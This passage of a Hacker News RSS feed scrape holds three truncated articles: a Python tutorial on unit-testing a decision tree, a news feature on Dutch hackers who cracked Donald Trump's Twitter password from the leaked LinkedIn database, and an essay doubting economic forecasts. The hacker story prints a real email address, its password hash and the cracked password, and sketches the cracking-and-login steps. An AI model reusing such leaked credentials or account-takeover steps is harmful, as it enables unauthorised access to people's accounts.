<p>First, we’ll test our functions of <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#Gini_impurity" target="_blank">Gini impurity</a> and <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#Information_gain" target="_blank">Gini gain</a>. These will be used to <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#General" target="_blank">split the data</a> and grow our decision tree.</p>

<div><div><pre><code><span>def</span> <span>test_gini_impurity</span><span>():</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.219</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.375</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.469</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.500</span>


<span>def</span> <span>test_gini_gain</span><span>():</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.5</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.125</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.125</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.0</span>
</code></pre></div></div>

<p>Next, we’ll check if the model prediction shape is expected. We should have the same number of rows as the input features.</p>

<div><div><pre><code><span>def</span> <span>test_dt_output_shape</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>X_test</span><span>,</span> <span>y_test</span> <span>=</span> <span>dummy_titanic</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
    <span>pred_train</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
    <span>pred_test</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_test</span><span>)</span>

    <span>assert</span> <span>pred_train</span><span>.</span><span>shape</span> <span>==</span> <span>(</span><span>X_train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],),</span> <span>'DecisionTree output should be same as training labels.'</span>
    <span>assert</span> <span>pred_test</span><span>.</span><span>shape</span> <span>==</span> <span>(</span><span>X_test</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],),</span> <span>'DecisionTree output should be same as testing labels.'</span>
</code></pre></div></div>

<p>We’ll also want to check the output ranges. Given that we’re predicting probabilities, we should expect the output to range from 0 to 1 inclusive.</p>

<div><div><pre><code><span>def</span> <span>test_dt_output_range</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>X_test</span><span>,</span> <span>y_test</span> <span>=</span> <span>dummy_titanic</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
    <span>pred_train</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
    <span>pred_test</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_test</span><span>)</span>

    <span>assert</span> <span>(</span><span>pred_train</span> <span>&lt;=</span> <span>1</span><span>).</span><span>all</span><span>()</span> <span>&amp;</span> <span>(</span><span>pred_train</span> <span>&gt;=</span> <span>0</span><span>).</span><span>all</span><span>(),</span> <span>'Decision tree output should range from 0 to 1 inclusive'</span>
    <span>assert</span> <span>(</span><span>pred_test</span> <span>&lt;=</span> <span>1</span><span>).</span><span>all</span><span>()</span> <span>&amp;</span> <span>(</span><span>pred_test</span> <span>&gt;=</span> <span>0</span><span>).</span><span>all</span><span>(),</span> <span>'Decision tree output should range from 0 to 1 inclusive'</span>
</code></pre></div></div>

<p>Here, we’ll check for test set leakage (i.e., duplicate rows in train/test splits) by concatenating train and test data, dropping duplicates, and checking the number of rows. (Note: Other leakages include <a href="https://www.fast.ai/2017/11/13/validation-sets/#time-series" target="_blank">temporal leaks</a> and <a href="https://en.wikipedia.org/wiki/Leakage_(machine_learning)#Feature_leakage" target="_blank">feature leaks</a>; we won’t cover them here.)</p>

<div><div><pre><code><span>def</span> <span>test_data_leak_in_test_data</span><span>(</span><span>dummy_titanic_df</span><span>):</span>
    <span>train</span><span>,</span> <span>test</span> <span>=</span> <span>dummy_titanic_df</span>

    <span>concat_df</span> <span>=</span> <span>pd</span><span>.</span><span>concat</span><span>([</span><span>train</span><span>,</span> <span>test</span><span>])</span>
    <span>concat_df</span><span>.</span><span>drop_duplicates</span><span>(</span><span>inplace</span><span>=</span><span>True</span><span>)</span>

    <span>assert</span> <span>concat_df</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span> <span>==</span> <span>train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span> <span>+</span> <span>test</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span>
</code></pre></div></div>

<p>Given perfectly separable data and unlimited depth, our decision tree should be able to “memorise” the training data and <em><a href="https://en.wikipedia.org/wiki/Overfitting" target="_blank">overfit</a> completely</em>. In other words, if we train <em>and</em> evaluate on the training data, we should get 100% accuracy. (Note: the Titanic data isn’t perfectly separable so we’ll create a small data sample for this.)</p>

<div><div><pre><code><span>@</span><span>pytest</span><span>.</span><span>fixture</span>
<span>def</span> <span>dummy_feats_and_labels</span><span>():</span>
    <span>feats</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([[</span><span>0.7057</span><span>,</span> <span>-</span><span>5.4981</span><span>,</span> <span>8.3368</span><span>,</span> <span>-</span><span>2.8715</span><span>],</span>
                      <span>[</span><span>2.4391</span><span>,</span> <span>6.4417</span><span>,</span> <span>-</span><span>0.80743</span><span>,</span> <span>-</span><span>0.69139</span><span>],</span>
                      <span>[</span><span>-</span><span>0.2062</span><span>,</span> <span>9.2207</span><span>,</span> <span>-</span><span>3.7044</span><span>,</span> <span>-</span><span>6.8103</span><span>],</span>
                      <span>[</span><span>4.2586</span><span>,</span> <span>11.2962</span><span>,</span> <span>-</span><span>4.0943</span><span>,</span> <span>-</span><span>4.3457</span><span>],</span>
                      <span>[</span><span>-</span><span>2.343</span><span>,</span> <span>12.9516</span><span>,</span> <span>3.3285</span><span>,</span> <span>-</span><span>5.9426</span><span>],</span>
                      <span>[</span><span>-</span><span>2.0545</span><span>,</span> <span>-</span><span>10.8679</span><span>,</span> <span>9.4926</span><span>,</span> <span>-</span><span>1.4116</span><span>],</span>
                      <span>[</span><span>2.2279</span><span>,</span> <span>4.0951</span><span>,</span> <span>-</span><span>4.8037</span><span>,</span> <span>-</span><span>2.1112</span><span>],</span>
                      <span>[</span><span>-</span><span>6.1632</span><span>,</span> <span>8.7096</span><span>,</span> <span>-</span><span>0.21621</span><span>,</span> <span>-</span><span>3.6345</span><span>],</span>
                      <span>[</span><span>0.52374</span><span>,</span> <span>3.644</span><span>,</span> <span>-</span><span>4.0746</span><span>,</span> <span>-</span><span>1.9909</span><span>],</span>
                      <span>[</span><span>1.5077</span><span>,</span> <span>1.9596</span><span>,</span> <span>-</span><span>3.0584</span><span>,</span> <span>-</span><span>0.12243</span><span>]</span>
                      <span>])</span>
    <span>labels</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>])</span>
    <span>return</span> <span>feats</span><span>,</span> <span>labels</span>

<span>def</span> <span>test_dt_overfit</span><span>(</span><span>dummy_feats_and_labels</span><span>):</span>
    <span>feats</span><span>,</span> <span>labels</span> <span>=</span> <span>dummy_feats_and_labels</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>feats</span><span>,</span> <span>labels</span><span>)</span>
    <span>pred</span> <span>=</span> <span>np</span><span>.</span><span>round</span><span>(</span><span>dt</span><span>.</span><span>predict</span><span>(</span><span>feats</span><span>))</span>

    <span>assert</span> <span>np</span><span>.</span><span>array_equal</span><span>(</span><span>labels</span><span>,</span> <span>pred</span><span>),</span> <span>'DecisionTree should fit data perfectly and prediction should == labels.'</span>
</code></pre></div></div>

<p>Lastly, we check if increasing tree depth leads to increased accuracy and AUC ROC on <em>training</em> data (though it’ll overfit and perform poorly on <em>validation</em> data). In the test below, we fit trees of depth one to 10 and ensure training accuracy and AUC increases consistently.</p>

<div><div><pre><code><span>def</span> <span>test_dt_increase_acc</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>_</span><span>,</span> <span>_</span> <span>=</span> <span>dummy_titanic</span>

    <span>acc_list</span> <span>=</span> <span>[]</span>
    <span>auc_list</span> <span>=</span> <span>[]</span>
    <span>for</span> <span>depth</span> <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>10</span><span>):</span>
        <span>dt</span> <span>=</span> <span>DecisionTree</span><span>(</span><span>depth_limit</span><span>=</span><span>depth</span><span>)</span>
        <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
        <span>pred</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
        <span>pred_binary</span> <span>=</span> <span>np</span><span>.</span><span>round</span><span>(</span><span>pred</span><span>)</span>
        <span>acc_list</span><span>.</span><span>append</span><span>(</span><span>accuracy_score</span><span>(</span><span>y_train</span><span>,</span> <span>pred_binary</span><span>))</span>
        <span>auc_list</span><span>.</span><span>append</span><span>(</span><span>roc_auc_score</span><span>(</span><span>y_train</span><span>,</span> <span>pred</span><span>))</span>

    <span>assert</span> <span>sorted</span><span>(</span><span>acc_list</span><span>)</span> <span>==</span> <span>acc_list</span><span>,</span> <span>'Accuracy should increase as tree depth increases.'</span>
    <span>assert</span> <span>sorted</span><span>(</span><span>auc_list</span><span>)</span> <span>==</span> <span>auc_list</span><span>,</span> <span>'AUC ROC should increase as tree depth increases.'</span>
</code></pre></div></div>

<h2 id="post-train-tests-to-ensure-expected-learned-behaviour">Post-train tests to ensure expected learned behaviour</h2>

<p>In post-train tests, we want to <strong>check if the model is behaving …</strong></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://eugeneyan.com/writing/testing-ml/">https://eugeneyan.com/writing/testing-ml/</a></em></p>]]>
            </description>
            <link>https://eugeneyan.com/writing/testing-ml/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24523930</guid>
            <pubDate>Sat, 19 Sep 2020 01:23:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How three Dutch hackers gained access to Donald Trump’s Twitter account]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522345">thread link</a>) | @arianvanp
<br/>
September 18, 2020 | https://www.vn.nl/hackers-twitter-trump-english/ | <a href="https://web.archive.org/web/*/https://www.vn.nl/hackers-twitter-trump-english/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>In 2016, three Dutch hackers &nbsp;got hold of Donald Trump’s Twitter password. It wasn’t the launch codes of a nuclear missile, but it came pretty close: one tweet could jeopardize world peace, or prevent Trump from becoming president. How does one handle this amount of responsibility?</p><section id="article-body" data-article-content-element="" data-article-uid="480201" data-restricted="false"><div data-article-content-target=""><p>On October 27, 2016 three middle-aged men were gathered in a room in Hotel Cathedral in the center of Ghent. All three typing away on a laptop.<br> “Uh oh”, one of them said.</p><p>A Twitter login screen displayed the Twitter handle @realdonaldtrump alongside a few password dots. Twitter also asked for an email address verification. ‘Donaldtrump@trump.com’ didn’t work, an error message appeared. And the login attempt failed. Remarkably, in a way that had not been foreseen. The email address was incorrect, the password however, matched!<br> “Did you use a VPN?”<br> “No. I didn’t think the password would work”.</p><blockquote><p>Was this a cyber-attack on an American presidential candidate?</p></blockquote><p>All three of them realized what this meant. The login attempt had been made using the hotel’s Wi-Fi. The Twitter log files now showed that there had been an attempt to log in on the account, from their hotel, using Donald Trump’s legitimate password. And these logfiles would undoubtedly be transferred to the U.S. intelligence services.</p><p>It could be perceived as a cyber-attack on an American presidential candidate.</p><p>Something that could get them into trouble and ruin their reputation, something they could not afford to let happen.</p><h5>Grumpy old hackers</h5><p>I first met with Edwin, Mattijs and Victor in June, in Amsterdam-Noord. “Up the stairs, first door on the left”. I enter a James-Bond-like setting, a room with high windows and a view of the IJ river, a dock with a drilling tower and a Russian polar ship. The three men are sitting at a large conference table. On the table, a few bottles of Club-Mate, the hacker’s preferred beverage.</p><p>It is immediately noticeable that the three of them are close. They have some resemblance to members of a rock band. Victor the talkative guitarist, Mattijs the thoughtful bass player and Edwin the grumpy drummer, who occasionally intervenes when the conversation tends to stray. All three are members of the GGOH – <em>The Guild of Grumpy Old Hackers</em>. Their <a href="http://ggoh.info/">website</a> displays an image with eight pirates and a bitcoin address. “No one has ever transferred a single bitcoin to us, though”.</p><p>The GGOH has about ten members: ‘Elite’ older hackers. Everyone has their own specialism. They do things the police or the army won’t or can’t do. They carry information they can’t ever share. They have decent day time jobs. Large corporates hire Edwin and Mattijs to help them with their information security. Victor is employed by a government agency. At night, however – they run ‘projects’. They love algorithms and the law, because where there are rules, mistakes happen. “Loopholes. Forgotten things.” says Edwin, “Such as the fact that churches have access to the municipal personal records database. Somewhat weird. The kind of thing that will trigger us to start a church of our own.”</p><blockquote><p>“Yes, the three of us could immobilize the country. And so could you. By yourself.”</p></blockquote><p>They aim to locate these mistakes before criminals, spies and terrorists do. And while doing so, they come across the craziest things. Such as bridges that can be opened via the internet, telescopic traffic bollards that can rise from the pavement using a laptop and pension funds that can be accessed with very limited difficulty. They are very careful to not mention specific examples. Mainly because of signed confidentiality agreements with clients. But also to not give others any ideas. “Yes, the three of us can immobilize the country”, says Mattijs, “but so can you, by yourself”.</p><p>In order to securely exchange information with colleagues working in information security, they attend hacker conferences such as BlackHat and DEF CON in Las Vegas, BruCON in Ghent and the Chaos Communication Congress in Leipzig, where I first heard about their story. “Dutch hackers hacked Trump’s Twitter account just before the 2016 elections”, someone there said.</p><p>Within a small bubble of the hacker community it was known who they were. And after a few months of strong persistence, the grumpy hackers agreed to speak with me. I was allowed to write up this story, on the sole condition that I would only mention their first names.</p><h5>Digital treasure trove</h5><p>In October 2016, the grumpy hackers attended another hacker conference. One they never miss: BruCON, held in the Aula Academica in Ghent, a nineteenth-century neoclassical building with Corinthian columns and a small lecture hall in the shape of an arena.</p><p>“We normally sit center downstairs, a little towards the back”, says Victor, “We do that mostly for me. I don’t like any hustle and bustle around me, and I also like to keep a little oversight. We listen to the talks and dig around on our machines a little bit in the meantime. But this time we were on the second floor, very high up. On very unpleasant wooden benches. And then there was a talk from someone I personally like very much, but the presentation contained incredibly annoying sheep sounds. Really. Every single slide: mèèh. So then Edwin said, ‘Yo that stolen LinkedIn data file has now been made publicly available’. That’s pretty cool, let’s go check it out”.</p><p>And so, accompanied by sheep chatter, the grumpy old hackers left the auditorium to go take a look at the LinkedIn file.</p><p>Everyone in information security had heard about ‘that LinkedIn database’. A digital treasure trove with 120 million usernames and hashes of passwords (see insert below to this piece). The loot of a digital burglary in 2012. The mastermind was Yevgeni Nikulin. Google his name and you will find his picture near a Lamborghini parked in front of the Basilius Cathedral on the Red Square in Moscow.</p><p>According to the lawsuit documentation now pending against him in the United States, he managed to get LinkedIn employees to click a link in an email and infected their computers with malware. Through these computers Nikulin managed to gain access to the internal LinkedIn network.</p><h5>Dark market</h5><p>Nikulin made a ton of money selling information to people in a secret criminal network. It is no coincidence that shortly after the LinkedIn break-in, Donald Trump’s Twitter account was hacked. On 21 February 2013, song lyrics by rapper Lil’ Wayne appeared on Trump’s Twitter account. Trump, who had ‘only’ two million followers at the time, reacted immediately:</p><p>‘My Twitter has been seriously hacked – and we are looking for the perpetrators’.</p><p>It wasn’t until the summer of 2016 that the LinkedIn file popped up on the black market. For 5 bitcoins – at that time the equivalent of about three thousand euros – it was offered on The RealDeal, a well-known dark market. This seemed very appealing to the grumpy old hackers.</p><p>“When you are responsible for the information security of a large company or a government agency, you will want access to such a database to see if it contains data of people from your own organization. Three thousand euros isn’t much for a database like this. If you only knew how many intelligence services would be willing to pay for this”, says Victor. “However, buying stolen data is a criminal offense. It is illegal, and we wouldn’t ever consider doing that. We’re not keen on financially aiding criminals. Also, the police access the dark markets too. They can identify buyers. It was absolutely out of the question for us to acquire that file”.</p><blockquote><p>Mark Rutte was on that list. So was Mark Zuckerberg.</p></blockquote><p>Security researchers who infiltrated criminal networks got their hands on the database, regardless. Within the information security community, these types of files are shared in order to better test one’s own security. Something that is impossible to do out in the open.</p><p>Edwin was the first to receive a link, which he immediately shared with Mattijs and Victor. They quickly left for the hotel to quietly conduct further research.</p><p>“I instantly found my director’s password in there”, says Victor, “I sent him a brief message, saying ‘look, it’s your password”. Dutch Prime Minister Mark Rutte was on the list. And so was Mark Zuckerberg (‘dadada’ – turned out afterwards that the password for his facebook account was ‘tadada’).</p><h5>‘Ethical hackers’</h5><p>A week and a half prior to the US elections, everyone in the information security domain was talking about Trump’s Twitter account. It was the most wanted target in the world. From hacktivists to foreign intelligence agencies, they were all out for that account. It was therefore very instinctive to check if Donald Trump was also in the database.</p><p>And he was, right there.<br> email: donaldtrump@trump.com<br> password hash: 07b8938319c267dcdb501665220204bbde87bf1d</p><p>Using the program John the Ripper – a tool hackers use to crack hashes – Mattijs identified the password in less than a second: yourefired</p><p>Edwin was typing it in before anyone could say anything.<br> The password was accepted, and as an extra verification step an email address had to be entered.<br> But the entered address was incorrect.</p><p>Edwin almost fell off his chair. It meant that Trump hadn’t changed his password after the 2013 ‘hack’.<br> Which was bad news.</p><blockquote><p>There was no time to waste. If anyone else would now hack Donald Trump’s Twitter account, they were the ones to be potentially blamed.</p></blockquote><p>The grumpy old hackers knew better than anyone that the Twitter administrators would be able to see that they had made a login attempt from their hotel with the correct Donald Trump password. And also that this information would sooner or later be passed on to the U.S. intelligence services. A login attempt on Donald Trump’s Twitter account could be perceived as a cyber-attack on a U.S. presidential candidate.</p><p>So there really was only one option. The grumpy hackers would have to prove that they were real ‘ethical hackers’. In order to demonstrate this in an unambiguous way, however – they would have to, ironically, break into Trump’s account. It would be the …</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.vn.nl/hackers-twitter-trump-english/">https://www.vn.nl/hackers-twitter-trump-english/</a></em></p>]]>
            </description>
            <link>https://www.vn.nl/hackers-twitter-trump-english/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24522345</guid>
            <pubDate>Fri, 18 Sep 2020 22:06:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Forecasting Fallacy]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24522322">thread link</a>) | @behoove
<br/>
September 18, 2020 | https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy | <a href="https://web.archive.org/web/*/https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1600438936254" id="item-5f5f85f0973bac65ca48c1f9"><div><div><div data-block-type="2" id="block-4be18d915b0dc68a6cc9"><div><h3>Introduction</h3><p>Marketers are prone to a prediction.</p><p>You’ll find them in the annual tirade of trend decks. In the PowerPoint projections of self-proclaimed prophets. In the feeds of forecasters and futurists.&nbsp;They crop up on every conference stage. They make their mark on every marketing magazine. And they work their way into every white paper.</p><p>To understand the extent of our forecasting fascination, I analysed the websites of three management consultancies looking for predictions with time frames ranging from 2025 to 2050. Whilst one prediction may be published multiple times, the size of the numbers still shocked me.&nbsp;Deloitte’s site makes 6904&nbsp;predictions.&nbsp;McKinsey &amp; Company make 4296. And Boston Consulting Group, 3679.</p><p>In total, these three&nbsp;companies’ websites include just shy of 15,000 predictions stretching out over the next 30 years.</p><p>But it doesn’t stop there.</p><p>My analysis finished in the year 2050 not because the predictions came to an end but because my enthusiasm did.</p><p>Search the sites and you’ll find forecasts stretching all the way to the year 2100. We’re still finding our feet in this century but some, it seems, already understand the next.</p><p>I believe the vast majority of these to be not forecasts but fantasies. Snake oil dressed up as science. Fiction masquerading as fact.</p><p>This article assesses how predictions have performed in five fields. It argues that poor projections have propagated throughout our society and proliferated throughout our industry. It argues that our fixation with forecasts is fundamentally flawed.</p><p>So instead of focussing on the future, let’s take a moment to look at the predictions of the past.&nbsp;Let’s see how our projections panned out.</p><h3>We can’t predict recessions</h3><p>The Economist’s “The World in 2020”, published in late 2019, brings together experts from business, politics and science to fill 150 pages with projections for the year ahead.</p><p>Editor Daniel Franklin&nbsp;<a href="https://theworldin.economist.com/edition/2020/article/17308/world-2020"><span>summarised</span></a>&nbsp;the issue’s predictions on 2020’s economic outlook:&nbsp;</p><blockquote><p>“Banks, especially in Europe, will battle with negative interest rates. America will flirt with recession—but don’t be surprised if disaster fails to strike, and markets revive.”</p></blockquote><p>Just over two months later COVID-19 struck, the world went into lockdown and we fell into one of the largest&nbsp;<a href="https://news.sky.com/story/coronavirus-largest-uk-recession-on-record-official-figures-12047521"><span>recessions</span></a>&nbsp;on record.</p><p>Perhaps this critique is unfair. The Economist wasn’t to know that we were on the precipice of a pandemic.&nbsp;So let’s review our success rate during more stable times.</p><p>Over to the&nbsp;<a href="https://www.ft.com/content/70a2a978-adac-11e7-8076-0a4bdda92ca2"><span>Financial Times</span></a>:</p><blockquote><p>&nbsp;“In the 2001 issue of the International Journal of Forecasting, an economist from the International Monetary Fund, Prakash Loungani, published a survey of the accuracy of economic forecasts throughout the 1990s. He reached two conclusions. The first was that forecasts are all much the same. There was little to choose between those produced by the IMF and the World Bank, and those from private sector forecasters. The second conclusion was that the predictive record of economists was terrible. Loungani wrote: “The record of failure to predict recessions is virtually unblemished.””</p></blockquote><p>It’s hard to overstate the severity of Loungani’s findings. His&nbsp;<a href="https://www.theguardian.com/money/2017/sep/02/economic-forecasting-flawed-science-data"><span>analysis</span></a>&nbsp;revealed that economists had failed to predict 148 of the past 150 recessions. To put it another way, the experts only saw 1.33% of recessions coming.</p><p>Others have pushed their analysis even further.</p><p>Andrew Brigden, Chief Economist at Fathom Consulting,&nbsp;<a href="https://www.bloomberg.com/news/articles/2019-03-28/economists-are-actually-terrible-at-forecasting-recessions"><span>analysed</span></a>&nbsp;the International Monetary Fund’s predictions across 30 years and 194 countries. The research found that only 4 of the 469 downturns had been predicted by the spring of the preceding year. Brigden’s success rate of 0.85% is remarkably consistent with Longani’s.&nbsp;<a href="https://www.fathom-consulting.com/the-economist-who-cried-wolf/"><span>Brigden</span></a>&nbsp;writes:</p><blockquote><p>“Since 1988, the IMF has never forecast a developed economy recession with a lead of anything more than a few months.”</p></blockquote><p>These two studies, and countless others, paint a pretty damning picture of our ability to spot recessions on the horizon.&nbsp;</p><p>It’s clear that our&nbsp;track record of predicting&nbsp;recessions is pretty patchy. But that doesn’t stop us from making more. As a slowdown turns into a downturn, economists rush to reassure by predicting when more stable times will return. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict GDP</h3><p>On 15&nbsp;September 2008 Lehman Brothers filed for bankruptcy.</p><p>Despite being the largest bankruptcy filing in U.S.&nbsp;history, the&nbsp;government refused to bail out the bank. Global financial stress quickly turned into an international emergency.</p><p>From its New York epicentre,&nbsp;the effects rippled around the world. International trade fell off a cliff. So did industrial production. Unemployment soared and consumer confidence collapsed.</p><p>7 months&nbsp;later, on 22 April 2009, the IMF&nbsp;published its&nbsp;<a href="https://www.imf.org/en/Publications/WEO/Issues/2016/12/31/World-Economic-Outlook-April-2009-Crisis-and-Recovery-22575"><span>World Economic Outlook</span></a>:</p><blockquote><p>“Even with determined steps to return the financial sector to health and continued use of macroeconomic policy levers to support aggregate demand, global activity is projected to contract by 1.3% in 2009. (…) Growth is projected to reemerge in 2010, but at 1.9% it would be sluggish relative to past recoveries.”</p></blockquote><p>These figures did not fare well.</p><p>Global GDP did contract in 2009 but by 0.7%, around half as severe as the forecast. In 2010, growth wasn’t sluggish but soaring. The global economy grew by a whopping 5.1%, two and a half times greater than the 1.9% predicted.&nbsp;</p><p>In an analysis of the IMF predictions by&nbsp;<a href="https://www.brookings.edu/blog/future-development/2020/04/14/the-world-economy-in-2020-the-imf-gets-it-mostly-right/"><span>The Brookings Institute</span></a>, the critique went even further:</p><blockquote><p>“(The IMF) got the numbers for China and India wrong. The numbers for 2010 were way off-target: The U.S. economy ended up growing by 3% instead of the forecasted zero, Germany’s economy by 3.5% instead of shrinking by one and Japan by 4% instead of -0.5%.”</p></blockquote><p>But it isn’t just the IMF. Take The World Bank.</p><p>On 1 January 2010, The&nbsp;World Bank published their&nbsp;<a href="http://documents.worldbank.org/curated/en/115101468337160604/Global-economic-prospects-2010-crisis-finance-and-growth"><span>Global Economic Prospects</span></a>&nbsp;report. With 9 months longer than the IMF, you’d expect their GDP predictions to be much more accurate. But they still missed the mark.</p><p>They predicted global GDP to grow 2.7% but in reality it increased 3.8%. 1.1% out. In China and&nbsp;India, they&nbsp;were 1.3% out. And in Japan they were 2.7% wide of the mark.</p><p>Clearly our GDP predictions are imprecise and imperfect. But that doesn’t stop us from making more. As society starts to stabilise, economists turn their attention to predicting more universal measures. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict interest rates</h3><p>On&nbsp;14 July 2015, two&nbsp;economics professors,&nbsp;Maurice Obstfeld and Linda Tesar, published an article on the&nbsp;<a href="https://obamawhitehouse.archives.gov/blog/2015/07/14/decline-long-term-interest-rates"><span>White House website</span></a>&nbsp;espousing the importance of interest rates:</p><blockquote><p>“The level of long-term interest rates is of central importance in the macroeconomy. It matters to borrowers looking to start a business or buy a home; lenders evaluating the risk and rewards of extending credit; savers preparing for college or retirement; and policymakers crafting the government’s budget.”</p></blockquote><p>With interest rates being so important to so many, it’s no surprise that an entire industry of professional predictors exists to monitor the rate’s past and forecast its future.</p><p><a href="https://www.wsj.com/articles/some-investors-had-hunch-yields-were-about-to-fall-11560072600"><span>The Wall Street Journal</span></a>&nbsp;surveyed a panel 